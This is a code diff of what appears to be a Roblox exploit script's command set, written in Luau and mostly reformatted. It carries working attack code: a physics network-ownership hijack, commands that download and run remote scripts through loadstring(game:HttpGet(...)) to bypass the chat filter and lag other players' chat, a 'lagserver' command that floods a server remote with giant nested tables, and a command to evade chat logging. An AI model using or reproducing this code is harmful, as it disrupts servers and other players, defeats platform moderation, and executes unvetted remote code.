-					local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
-					if Distance > 1000 then
-						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+		Network["Output"].Send(print,": Loading.")
+		Network["Velocity"] = Vector3.new(14.46262424,14.46262424,14.46262424); --exactly 25.1 magnitude
+		Network["RetainPart"] = function(Part,ReturnFakePart) --function for retaining ownership of unanchored parts
+			assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be a BasePart which is a descendant of workspace.")
+			assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (ReturnFakePart) must be a boolean or nil.")
+			if not table.find(Network["BaseParts"],Part) then
+				if Network.CharacterRelative == true then
+					local Character = LocalPlayer.Character
+					if Character and Character.PrimaryPart then
+						local Distance = (Character.PrimaryPart.Position-Part.Position).Magnitude
+						if Distance > 1000 then
+							Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+							return false
+						end
+					else
+						Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
 						return false
 					end
-				else
-					Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-					return false
 				end
-			end
-			table.insert(Network["BaseParts"],Part)
-			Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
-			if ReturnFakePart == true then
-				return FakePart
-			end
-		else
-			Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
-			return false
-		end
-	end
-
-	Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
-		assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
-		local Index = table.find(Network["BaseParts"],Part)
-		if Index then
-			table.remove(Network["BaseParts"],Index)
-			Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
-		else
-			Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
-		end
-	end
-
-	Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
-	for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
-		Event:Connect(function()
-			return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
-		end)
-	end
-
-	Network["PartOwnership"] = {};
-	Network["PartOwnership"]["PreMethodSettings"] = {};
-	Network["PartOwnership"]["Enabled"] = false;
-	Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
-		if Network["PartOwnership"]["Enabled"] == false then
-			Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
-			Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
-			LocalPlayer.ReplicationFocus = workspace
-			Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
-			Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
-				sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
-				for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
-					coroutine.wrap(function()
-						if Part:IsDescendantOf(workspace) then
-							if Network.CharacterRelative == true then
-								local Character = LocalPlayer.Character;
-								if Character and Character.PrimaryPart then
-									local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
-									if Distance > 1000 then
-										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
-										Lost = true;
-										Network["RemovePart"](Part)
-									end
-								else
-									Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
-								end
-							end
-							Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
-						else
-							Network["RemovePart"](Part)
-						end
-					end)()
+				table.insert(Network["BaseParts"],Part)
+				Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+				Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
+				if ReturnFakePart == true then
+					return FakePart
 				end
+			else
+				Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
+				return false
+			end
+		end
+
+		Network["RemovePart"] = function(Part) --function for removing ownership of unanchored part
+			assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
+			local Index = table.find(Network["BaseParts"],Part)
+			if Index then
+				table.remove(Network["BaseParts"],Index)
+				Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
+			else
+				Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
+			end
+		end
+
+		Network["SuperStepper"] = Instance.new("BindableEvent") --make super fast event to connect to
+		for _,Event in pairs({RunService.Stepped,RunService.Heartbeat}) do
+			Event:Connect(function()
+				return Network["SuperStepper"]:Fire(Network["SuperStepper"],tick())
 			end)
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
 		end
-	end)
-	Network["PartOwnership"]["Disable"] = coroutine.create(function()
-		if Network["PartOwnership"]["Connection"] then
-			Network["PartOwnership"]["Connection"]:Disconnect()
-			LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
-			sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
-			Network["PartOwnership"]["PreMethodSettings"] = {}
-			for _,Part in pairs(Network["BaseParts"]) do
-				Network["RemovePart"](Part)
+
+		Network["PartOwnership"] = {};
+		Network["PartOwnership"]["PreMethodSettings"] = {};
+		Network["PartOwnership"]["Enabled"] = false;
+		Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
+			if Network["PartOwnership"]["Enabled"] == false then
+				Network["PartOwnership"]["Enabled"] = true --do cool network stuff before doing more cool network stuff
+				Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
+				LocalPlayer.ReplicationFocus = workspace
+				Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
+				Network["PartOwnership"]["Connection"] = Network["SuperStepper"].Event:Connect(function() --super fast asynchronous loop
+					sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
+					for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
+						coroutine.wrap(function()
+							if Part:IsDescendantOf(workspace) then
+								if Network.CharacterRelative == true then
+									local Character = LocalPlayer.Character;
+									if Character and Character.PrimaryPart then
+										local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
+										if Distance > 1000 then
+											Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
+											Lost = true;
+											Network["RemovePart"](Part)
+										end
+									else
+										Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
+									end
+								end
+								Part.Velocity = Network["Velocity"]+Vector3.new(0,math.cos(tick()*10)/100,0) --keep network by sending physics packets of 30 magnitude + an everchanging addition in the y level so roblox doesnt get triggered and fuck your ownership
+							else
+								Network["RemovePart"](Part)
+							end
+						end)()
+					end
+				end)
+				Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
+			else
+				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
 			end
-			Network["PartOwnership"]["Enabled"] = false
-			Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
-		else
-			Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
+		end)
+		Network["PartOwnership"]["Disable"] = coroutine.create(function()
+			if Network["PartOwnership"]["Connection"] then
+				Network["PartOwnership"]["Connection"]:Disconnect()
+				LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
+				sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
+				Network["PartOwnership"]["PreMethodSettings"] = {}
+				for _,Part in pairs(Network["BaseParts"]) do
+					Network["RemovePart"](Part)
+				end
+				Network["PartOwnership"]["Enabled"] = false
+				Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
+			else
+				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
+			end
+		end)
+		Network["Output"].Send(print,": Loaded.")
+	end
+
+	coroutine.resume(Network["PartOwnership"]["Enable"])
+
+
+
+	local lp = game.Players.LocalPlayer -- local player var
+	local char = lp.Character -- char var
+
+	lp.Character = nil -- nil character for pdeath
+	lp.Character = char -- newvar
+
+	local hrp = char:FindFirstChild("HumanoidRootPart") -- hrp check
+	if hrp == nil then return end -- return if no hrp
+
+	wait(game.Players.RespawnTime + .3) -- nil wait
+
+	hrp:Destroy() -- rip hrp
+	char.Torso:Destroy() -- rip torso
+	local clone = char["Body Colors"]:Clone() -- body colors clone
+	char["Body Colors"]:Destroy() -- delete any instances from char that replicates deletion
+	clone.Parent = char -- parent back in clone in case some script uses it
+
+
+
+
+	player = game:GetService("Players").LocalPlayer
+	Gui = player.PlayerGui
+	Backpack = player.Backpack
+	Mouse = player:GetMouse()
+
+	Parts_Folder = Instance.new("Folder",workspace)
+
+	for i,v in pairs(player.Character:GetChildren()) do
+		if v:IsA("Accessory") then
+			local Part = Instance.new("Part",Parts_Folder)
+			Part.Name = v.Name
+			Part.Anchored = true
+			Part.Size = v.Handle.Size - Vector3.new(0.001,0.001,0.001)
+			Part.Position = player.Character.Head.Position + Vector3.new(math.random(-5,5),math.random(-1,1),math.random(-5,5))
+			Part:SetAttribute("Moveable",true)
+			Part.Material = Enum.Material.SmoothPlastic
+			Part.CanCollide = false
+			Part.Transparency = 1
+			Part.Color = Color3.new(1,0,0)
+
+			local Hat = v.Handle
+			local vbreak = false
+			Network.RetainPart(Hat)
+			Hat.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
+			coroutine.wrap(function()
+				while task.wait() do
+					if vbreak == true then break end
+					Hat.CFrame = Part.CFrame
+				end
+			end)()
+			--Hat:FindFirstChildWhichIsA("SpecialMesh"):Destroy() --Doesn't replicate
+		end
+	end
+
+
+	Move_Tool = Instance.new("Tool",Backpack)
+	Rotate_Tool = Instance.new("Tool",Backpack)
+	MHandle = Instance.new("Part",Move_Tool)
+	RHandle = Instance.new("Part",Rotate_Tool)
+	Mgrabs = Instance.new("Handles",Gui)
+	Rgrabs = Instance.new("ArcHandles",Gui)
+	Outline = Instance.new("Highlight")
+
+	Move_Tool.Name = "Move"
+	Move_Tool.CanBeDropped = false
+
+	Rotate_Tool.Name = "Rotate"
+	Rotate_Tool.CanBeDropped = false
+
+	MHandle.Name = "Handle"
+	MHandle.Transparency = 1
+
+	RHandle.Name = "Handle"
+	RHandle.Transparency = 1
+
+	Mgrabs.Visible = false
+	Mgrabs.Color3 = Color3.new(1, 0.8, 0)
+	Mgrabs.Style = "Movement"
+
+	Rgrabs.Visible = false
+
+	Outline.FillTransparency = 1
+	Outline.OutlineTransparency = 0
+	Outline.OutlineColor = Color3.new(1, 0.8, 0)
+
+	Active_Part = nil
+
+	Move_Tool.AncestryChanged:Connect(function()
+		if Move_Tool.Parent == char and Active_Part ~= nil then
+			Mgrabs.Visible = true
+			Mgrabs.Adornee = Active_Part
 		end
 	end)
-	Network["Output"].Send(print,": Loaded.")
-end
 
-coroutine.resume(Network["PartOwnership"]["Enable"])
+	Move_Tool.AncestryChanged:Connect(function()
+		if Move_Tool.Parent ~= char then
+			Mgrabs.Visible = false
+			Mgrabs.Adornee = nil
+		end
+	end)
+
+	Mouse.Button1Down:Connect(function()
+		if Move_Tool.Parent == char and Mouse.Target:GetAttribute("Moveable") then
+			Active_Part = Mouse.Target
+			Mgrabs.Visible = true
+			Mgrabs.Adornee = Active_Part
+			Outline.Parent = Active_Part
+		end
+		if Rotate_Tool.Parent == char and Mouse.Target:GetAttribute("Moveable") then
+			Active_Part = Mouse.Target
+			Rgrabs.Visible = true
+			Rgrabs.Adornee = Active_Part
+			Outline.Parent = Active_Part
+		end
+	end)
+
+	Rotate_Tool.AncestryChanged:Connect(function()
+		if Rotate_Tool.Parent == char and Active_Part ~= nil then
+			Rgrabs.Visible = true
+			Rgrabs.Adornee = Active_Part
+		end
+	end)
+
+	Rotate_Tool.AncestryChanged:Connect(function()
+		if Rotate_Tool.Parent ~= char then
+			Rgrabs.Visible = false
+			Rgrabs.Adornee = nil
+		end
+	end)
+
+	MOGCFrame = CFrame.new()
+
+	Mgrabs.MouseButton1Down:Connect(function()
+		MOGCFrame = Active_Part.CFrame
+	end)
+
+	Mgrabs.MouseDrag:Connect(function(knob, pos)
+		if knob == Enum.NormalId.Front then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * pos
+		end
+		if knob == Enum.NormalId.Back then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * -pos
+		end
+		if knob == Enum.NormalId.Top then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * pos
+		end
+		if knob == Enum.NormalId.Bottom then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * -pos
+		end
+		if knob == Enum.NormalId.Left then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * -pos
+		end
+		if knob == Enum.NormalId.Right then
+			Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * pos
+		end
+	end)
+
+	ROGCFrame = CFrame.new()
+
+	Rgrabs.MouseButton1Down:Connect(function()
+		ROGCFrame = Active_Part.CFrame
+	end)
+
+	Rgrabs.MouseDrag:Connect(function(knob, angle)
+		if knob == Enum.Axis.Y then
+			Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,angle,0)
+		end
+		if knob == Enum.Axis.X then
+			Active_Part.CFrame = ROGCFrame * CFrame.Angles(angle,0,0)
+		end
+		if knob == Enum.Axis.Z then
+			Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,0,angle)
+		end
+	end)
 
 
 
-local lp = game.Players.LocalPlayer -- local player var
-local char = lp.Character -- char var
-
-lp.Character = nil -- nil character for pdeath
-lp.Character = char -- newvar
-
-local hrp = char:FindFirstChild("HumanoidRootPart") -- hrp check
-if hrp == nil then return end -- return if no hrp
-
-wait(game.Players.RespawnTime + .3) -- nil wait
-
-hrp:Destroy() -- rip hrp
-char.Torso:Destroy() -- rip torso
-local clone = char["Body Colors"]:Clone() -- body colors clone
-char["Body Colors"]:Destroy() -- delete any instances from char that replicates deletion
-clone.Parent = char -- parent back in clone in case some script uses it
+	Mouse.TargetFilter = player.Character
 
 
 
+	camera = workspace.CurrentCamera
+	input = game:GetService("UserInputService")
 
-player = game:GetService("Players").LocalPlayer
-Gui = player.PlayerGui
-Backpack = player.Backpack
-Mouse = player:GetMouse()
+	Camera_Part = Instance.new("Part",workspace)
+	Camera_Part.Anchored = true
+	Camera_Part.Transparency = 0.85
+	Camera_Part.Shape = Enum.PartType.Ball
+	Camera_Part.Size = Vector3.new(0.5,0.5,0.5)
+	Camera_Part.Material = Enum.Material.SmoothPlastic
 
-Parts_Folder = Instance.new("Folder",workspace)
+	current_position = char.Head.Position
 
-for i,v in pairs(player.Character:GetChildren()) do
-	if v:IsA("Accessory") then
-		local Part = Instance.new("Part",Parts_Folder)
-		Part.Name = v.Name
-		Part.Anchored = true
-		Part.Size = v.Handle.Size - Vector3.new(0.001,0.001,0.001)
-		Part.Position = player.Character.Head.Position + Vector3.new(math.random(-5,5),math.random(-1,1),math.random(-5,5))
-		Part:SetAttribute("Moveable",true)
-		Part.Material = Enum.Material.SmoothPlastic
-		Part.CanCollide = false
-		Part.Color = Color3.new(1,0,0)
-        
-        local Hat = v.Handle
-        local vbreak = false
-        Network.RetainPart(Hat)
-        Hat.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
-        coroutine.wrap(function()
-            while task.wait() do
-                if vbreak == true then break end
-                Hat.CFrame = Part.CFrame
-            end
-        end)()
-        Hat:FindFirstChildWhichIsA("SpecialMesh"):Destroy()
+	camera.CameraSubject = Camera_Part
+
+
+
+	for i,v in pairs(char:GetDescendants()) do
+		if v:IsA("BasePart") and v.Parent:IsA("Accessory") == false then
+			v:Destroy()
+		end
 	end
-end
 
-
-Move_Tool = Instance.new("Tool",Backpack)
-Rotate_Tool = Instance.new("Tool",Backpack)
-MHandle = Instance.new("Part",Move_Tool)
-RHandle = Instance.new("Part",Rotate_Tool)
-Mgrabs = Instance.new("Handles",Gui)
-Rgrabs = Instance.new("ArcHandles",Gui)
-Outline = Instance.new("Highlight")
-
-Move_Tool.Name = "Move"
-Move_Tool.CanBeDropped = false
-
-Rotate_Tool.Name = "Rotate"
-Rotate_Tool.CanBeDropped = false
-
-MHandle.Name = "Handle"
-MHandle.Transparency = 1
-
-RHandle.Name = "Handle"
-RHandle.Transparency = 1
-
-Mgrabs.Visible = false
-Mgrabs.Color3 = Color3.new(1, 0.8, 0)
-Mgrabs.Style = "Movement"
-
-Rgrabs.Visible = false
-
-Outline.FillTransparency = 1
-Outline.OutlineTransparency = 0
-Outline.OutlineColor = Color3.new(1, 0.8, 0)
-
-Active_Part = nil
-
-Move_Tool.AncestryChanged:Connect(function()
-	if Move_Tool.Parent == char and Active_Part ~= nil then
-		Mgrabs.Visible = true
-		Mgrabs.Adornee = Active_Part
-	end
-end)
-
-Move_Tool.AncestryChanged:Connect(function()
-	if Move_Tool.Parent ~= char then
-		Mgrabs.Visible = false
-		Mgrabs.Adornee = nil
-	end
-end)
-
-Mouse.Button1Down:Connect(function()
-	if Move_Tool.Parent == char and Mouse.Target:GetAttribute("Moveable") then
-		Active_Part = Mouse.Target
-		Mgrabs.Visible = true
-		Mgrabs.Adornee = Active_Part
-		Outline.Parent = Active_Part
-	end
-	if Rotate_Tool.Parent == char and Mouse.Target:GetAttribute("Moveable") then
-		Active_Part = Mouse.Target
-		Rgrabs.Visible = true
-		Rgrabs.Adornee = Active_Part
-		Outline.Parent = Active_Part
-	end
-end)
-
-Rotate_Tool.AncestryChanged:Connect(function()
-	if Rotate_Tool.Parent == char and Active_Part ~= nil then
-		Rgrabs.Visible = true
-		Rgrabs.Adornee = Active_Part
-	end
-end)
-
-Rotate_Tool.AncestryChanged:Connect(function()
-	if Rotate_Tool.Parent ~= char then
-		Rgrabs.Visible = false
-		Rgrabs.Adornee = nil
-	end
-end)
-
-MOGCFrame = CFrame.new()
-
-Mgrabs.MouseButton1Down:Connect(function()
-	MOGCFrame = Active_Part.CFrame
-end)
-
-Mgrabs.MouseDrag:Connect(function(knob, pos)
-	if knob == Enum.NormalId.Front then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * pos
-	end
-	if knob == Enum.NormalId.Back then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.LookVector * -pos
-	end
-	if knob == Enum.NormalId.Top then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * pos
-	end
-	if knob == Enum.NormalId.Bottom then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.UpVector * -pos
-	end
-	if knob == Enum.NormalId.Left then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * -pos
-	end
-	if knob == Enum.NormalId.Right then
-		Active_Part.CFrame = MOGCFrame + MOGCFrame.RightVector * pos
+	while wait() do
+		if vbreak == true then
+			break
+		end
+		if input:IsKeyDown(Enum.KeyCode.D) then
+			current_position += camera.CFrame.RightVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.A) then
+			current_position += camera.CFrame.RightVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.W) then
+			current_position += camera.CFrame.LookVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.S) then
+			current_position += camera.CFrame.LookVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.E) then
+			current_position += camera.CFrame.UpVector * speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.Q) then
+			current_position += camera.CFrame.UpVector * -speed
+		end
+		if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
+				speed = 1.5
+			end else
+			speed = 0.75
+		end
+		Camera_Part.Position = current_position
 	end
 end)
-
-ROGCFrame = CFrame.new()
-
-Rgrabs.MouseButton1Down:Connect(function()
-	ROGCFrame = Active_Part.CFrame
-end)
-
-Rgrabs.MouseDrag:Connect(function(knob, angle)
-	if knob == Enum.Axis.Y then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,angle,0)
-	end
-	if knob == Enum.Axis.X then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(angle,0,0)
-	end
-	if knob == Enum.Axis.Z then
-		Active_Part.CFrame = ROGCFrame * CFrame.Angles(0,0,angle)
-	end
-end)
-
-
-
-Mouse.TargetFilter = player.Character
-
-
-
-camera = workspace.CurrentCamera
-input = game:GetService("UserInputService")
-
-Camera_Part = Instance.new("Part",workspace)
-Camera_Part.Anchored = true
-Camera_Part.Transparency = 0.85
-Camera_Part.Shape = Enum.PartType.Ball
-Camera_Part.Size = Vector3.new(0.5,0.5,0.5)
-Camera_Part.Material = Enum.Material.SmoothPlastic
-
-current_position = char.Head.Position
-
-camera.CameraSubject = Camera_Part
-
-
-
-for i,v in pairs(char:GetDescendants()) do
-	if v:IsA("BasePart") and v.Parent:IsA("Accessory") == false then
-		v:Destroy()
-	end
-end
-
-while wait() do
-	if vbreak == true then
-		break
-	end
-	if input:IsKeyDown(Enum.KeyCode.D) then
-		current_position += camera.CFrame.RightVector * speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.A) then
-		current_position += camera.CFrame.RightVector * -speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.W) then
-		current_position += camera.CFrame.LookVector * speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.S) then
-		current_position += camera.CFrame.LookVector * -speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.E) then
-		current_position += camera.CFrame.UpVector * speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.Q) then
-		current_position += camera.CFrame.UpVector * -speed
-	end
-	if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
-			speed = 1.5
-		end else
-		speed = 0.75
-	end
-	Camera_Part.Position = current_position
-end
-    end)
 
 AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
 	local Speed = Args[1] or 5
@@ -8690,10 +7369,10 @@ end)
 
 AddCommand("chatbypass", {}, "bypasses chat filter", {}, function(Caller)
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/betterbypasser", true))({
-    Method = 1, -- Method 1 is the main method. Method two is emojis. Method 3 is full transparency, no special symbols.
-    Keybind = "f", -- Usually defaulted to F. You can change this keybind by replacing the string with a letter. Must be lowercase
-    ShowMethodDictionary = true -- Shows you the full list of words that you can say with the method. Press FN + F9 to see this dictionary.
-})
+		Method = 1, -- Method 1 is the main method. Method two is emojis. Method 3 is full transparency, no special symbols.
+		Keybind = "f", -- Usually defaulted to F. You can change this keybind by replacing the string with a letter. Must be lowercase
+		ShowMethodDictionary = true -- Shows you the full list of words that you can say with the method. Press FN + F9 to see this dictionary.
+	})
 end)
 
 AddCommand("antichatlog", {}, "blocks roblox from logging your chat", {}, function()
@@ -8702,17 +7381,17 @@ AddCommand("antichatlog", {}, "blocks roblox from logging your chat", {}, functi
 end)
 
 AddCommand("lagchat", {}, "makes people lag using chat", {}, function()
+    --<Chat Lag>--
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatLag.lua"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/ChatLag.lua"))()
-
---<Anti Lag For Yourself>--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLag.lua"))()
+	--<Anti Lag For Yourself>--
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLag.lua"))()
 end)
 
 AddCommand("errorchat", {}, "makes the chat error appear", {}, function()
 	for i=1,3 do 
-        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
-    end
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
+	end
 end)
 
 AddCommand("chat", {}, "sends a message", {"1"}, function(Caller, Args)
@@ -8744,55 +7423,55 @@ AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, functio
 end)
 
 AddCommand("lagserver", {}, "lags the entire server", {}, function(Caller)
-    local char = game:GetService('Players').LocalPlayer.Character or nil
+	local char = game:GetService('Players').LocalPlayer.Character or nil
 	if char then
-	char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
-	task.wait(0.5)
-	char.HumanoidRootPart.Anchored = true
+		char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
+		task.wait(0.5)
+		char.HumanoidRootPart.Anchored = true
 	end
 	while wait(1.5) do --// don't change it's the best
-	game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-	local function getmaxvalue(val)
-	   local mainvalueifonetable = 499999
-	   if type(val) ~= "number" then
-		   return nil
-	   end
-	   local calculateperfectval = (mainvalueifonetable/(val+2))
-	   return calculateperfectval
-	end
-	 
-	local function bomb(tableincrease, tries)
-	local maintable = {}
-	local spammedtable = {}
-	 
-	table.insert(spammedtable, {})
-	z = spammedtable[1]
-	 
-	for i = 1, tableincrease do
-		local tableins = {}
-		table.insert(z, tableins)
-		z = tableins
-	end
-	 
-	local calculatemax = getmaxvalue(tableincrease)
-	local maximum
-	 
-	if calculatemax then
-		 maximum = calculatemax
-		 else
-		 maximum = 999999
-	end
-	 
-	for i = 1, maximum do
-		 table.insert(maintable, spammedtable)
-	end
-	 
-	for i = 1, tries do
-		 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-	end
-	end
-	 
-	bomb(289, 5) --// change values if client crashes
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		local function getmaxvalue(val)
+			local mainvalueifonetable = 499999
+			if type(val) ~= "number" then
+				return nil
+			end
+			local calculateperfectval = (mainvalueifonetable/(val+2))
+			return calculateperfectval
+		end
+
+		local function bomb(tableincrease, tries)
+			local maintable = {}
+			local spammedtable = {}
+
+			table.insert(spammedtable, {})
+			z = spammedtable[1]
+
+			for i = 1, tableincrease do
+				local tableins = {}
+				table.insert(z, tableins)
+				z = tableins
+			end
+
+			local calculatemax = getmaxvalue(tableincrease)
+			local maximum
+
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 999999
+			end
+
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+
+			for i = 1, tries do
+				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+			end
+		end
+
+		bomb(289, 5) --// change values if client crashes
 	end
 end)
 
@@ -9736,7 +8415,7 @@ AddCommand("sync", {"syncaudios"}, "syncs audios playing", {3}, function()
 end)
 
 AddCommand("dex", {"explorer"}, "loads dark explorer", {}, function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/awesome-explorer/main/source.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/awesome-explorer/main/source.lua"))()
 	--loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Lazy_Dex.lua"))()
 end)
 
